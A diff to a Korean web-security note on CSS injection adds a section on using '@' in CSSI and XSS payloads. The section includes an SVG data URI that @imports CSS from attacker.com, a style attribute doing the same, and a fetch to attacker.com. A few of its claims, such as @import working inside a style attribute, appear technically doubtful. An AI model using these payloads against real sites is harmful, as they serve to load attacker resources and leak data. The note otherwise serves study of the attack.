@@ -85,7 +85,35 @@ CSSI는 **DOM에 삽입될 때만 유효**, URL fragment나 단순 GET 파라미
 div { animation: exfil 1s infinite; }
 ```
 
-* CSS로 UI 상 변화 관찰 → 제한적 정보 유출 가능
+---
+
+#### CSSI + XSS에서의 `@` 활용
+
+1. **data URI + @ 사용**
+
+```html
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><style>@import 'https://attacker.com/evil.css';</style></svg>">
+```
+
+* SVG 내부에서 `@import` 사용 → CSSI와 XSS 혼합
+* 브라우저가 CSS 해석 → 외부 요청 가능
+
+2. **CSS 속성 내부 @ 활용**
+
+```html
+<div style="@import url('https://attacker.com/evil.css');"></div>
+```
+
+* style 속성에서 @import → 외부 CSS 로딩
+
+3. **JavaScript에서 URL로 @ 포함**
+
+```javascript
+fetch("https://attacker.com/@payload");
+```
+
+* XSS 페이로드가 JS 실행될 때 `@` 포함 URL 요청 가능
+* 직접적으로 `@`가 공격의 핵심은 아니고, URL 경로 조작 용도
 
 ---
 
